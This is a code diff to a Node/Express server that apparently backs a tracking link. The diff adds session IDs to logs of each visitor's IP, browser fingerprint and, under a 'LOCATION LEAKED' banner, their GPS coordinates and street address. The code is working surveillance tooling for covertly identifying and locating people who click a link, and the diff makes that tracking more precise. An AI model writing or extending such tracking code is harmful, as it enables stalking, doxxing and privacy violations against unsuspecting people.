@@ -43,12 +43,18 @@ function getClientIp(req) {
   return req.ip || req.connection.remoteAddress;
 }
 
+// Generate a short random session ID to distinguish users with same IP
+function generateSessionId() {
+  return Math.random().toString(36).substring(2, 8).toUpperCase();
+}
+
 // Helper to log visitor fingerprint
-function logVisit(ip, fingerprint) {
+function logVisit(ip, fingerprint, sessionId) {
   const timestamp = new Date().toLocaleString();
   console.log(`\n${colors.yellow}${colors.bright}==================================================${colors.reset}`);
   console.log(`${colors.yellow}${colors.bright}🔗 LINK CLICKED / VISIT DETECTED @ ${timestamp}${colors.reset}`);
   console.log(`${colors.yellow}--------------------------------------------------${colors.reset}`);
+  console.log(`${colors.cyan}Session ID:${colors.reset}   #${sessionId}`);
   console.log(`${colors.cyan}IP Address:${colors.reset}   ${ip}`);
   console.log(`${colors.cyan}OS / Browser:${colors.reset} ${fingerprint.browser} on ${fingerprint.os}`);
   console.log(`${colors.cyan}Resolution:${colors.reset}   ${fingerprint.screenRes}`);
@@ -59,7 +65,7 @@ function logVisit(ip, fingerprint) {
   console.log(`${colors.cyan}User Agent:${colors.reset}   ${fingerprint.rawUa}`);
   console.log(`${colors.yellow}${colors.bright}==================================================${colors.reset}\n`);
 
-  const logLine = `[${timestamp}] VISIT - IP: ${ip}, OS: ${fingerprint.os}, Browser: ${fingerprint.browser}, GPU: ${fingerprint.gpu}, Resolution: ${fingerprint.screenRes}\n`;
+  const logLine = `[${timestamp}] [#${sessionId}] VISIT - IP: ${ip}, OS: ${fingerprint.os}, Browser: ${fingerprint.browser}, GPU: ${fingerprint.gpu}, Resolution: ${fingerprint.screenRes}\n`;
 
   // Write log to file safely (read-only file system protection)
   try {
@@ -72,7 +78,7 @@ function logVisit(ip, fingerprint) {
 }
 
 // Helper to log location permission decision and coordinates/details
-function logLocation(ip, locationData) {
+function logLocation(ip, locationData, sessionId) {
   const timestamp = new Date().toLocaleString();
   let logLine = '';
 
@@ -80,6 +86,7 @@ function logLocation(ip, locationData) {
     console.log(`\n${colors.red}${colors.bright}==================================================${colors.reset}`);
     console.log(`${colors.red}${colors.bright}📍 LOCATION LEAKED (GRANTED) @ ${timestamp}${colors.reset}`);
     console.log(`${colors.red}--------------------------------------------------${colors.reset}`);
+    console.log(`${colors.cyan}Session ID:${colors.reset}   #${sessionId}`);
     console.log(`${colors.cyan}IP Address:${colors.reset}   ${ip}`);
     console.log(`${colors.cyan}Latitude:${colors.reset}     ${locationData.lat}`);
     console.log(`${colors.cyan}Longitude:${colors.reset}    ${locationData.lng}`);
@@ -87,16 +94,17 @@ function logLocation(ip, locationData) {
     console.log(`${colors.cyan}Address:${colors.reset}      ${locationData.address}`);
     console.log(`${colors.red}${colors.bright}==================================================${colors.reset}\n`);
 
-    logLine = `[${timestamp}] LOCATION GRANTED - IP: ${ip}, Lat: ${locationData.lat}, Lng: ${locationData.lng}, Accuracy: ±${Math.round(locationData.accuracy)}m, Address: ${locationData.address}\n`;
+    logLine = `[${timestamp}] [#${sessionId}] LOCATION GRANTED - IP: ${ip}, Lat: ${locationData.lat}, Lng: ${locationData.lng}, Accuracy: ±${Math.round(locationData.accuracy)}m, Address: ${locationData.address}\n`;
   } else {
     console.log(`\n${colors.green}${colors.bright}==================================================${colors.reset}`);
     console.log(`${colors.green}${colors.bright}🛡️ LOCATION BLOCKED (DENIED) @ ${timestamp}${colors.reset}`);
     console.log(`${colors.green}--------------------------------------------------${colors.reset}`);
+    console.log(`${colors.cyan}Session ID:${colors.reset}   #${sessionId}`);
     console.log(`${colors.cyan}IP Address:${colors.reset}   ${ip}`);
     console.log(`${colors.green}Message: The user denied location permission request.${colors.reset}`);
     console.log(`${colors.green}${colors.bright}==================================================${colors.reset}\n`);
 
-    logLine = `[${timestamp}] LOCATION DENIED - IP: ${ip}\n`;
+    logLine = `[${timestamp}] [#${sessionId}] LOCATION DENIED - IP: ${ip}\n`;
   }
 
   // Write log to file safely (read-only file system protection)
@@ -113,18 +121,20 @@ function logLocation(ip, locationData) {
 app.post('/api/visit', (req, res) => {
   const ip = getClientIp(req);
   const fingerprint = req.body.fingerprint;
+  const sessionId = req.body.sessionId || generateSessionId();
   if (fingerprint) {
-    logVisit(ip, fingerprint);
+    logVisit(ip, fingerprint, sessionId);
   }
-  res.json({ success: true });
+  res.json({ success: true, sessionId });
 });
 
 // API endpoint for when a visitor grants or denies location access
 app.post('/api/location', (req, res) => {
   const ip = getClientIp(req);
   const locationData = req.body.location;
+  const sessionId = req.body.sessionId || generateSessionId();
   if (locationData) {
-    logLocation(ip, locationData);
+    logLocation(ip, locationData, sessionId);
   }
   res.json({ success: true });
 });
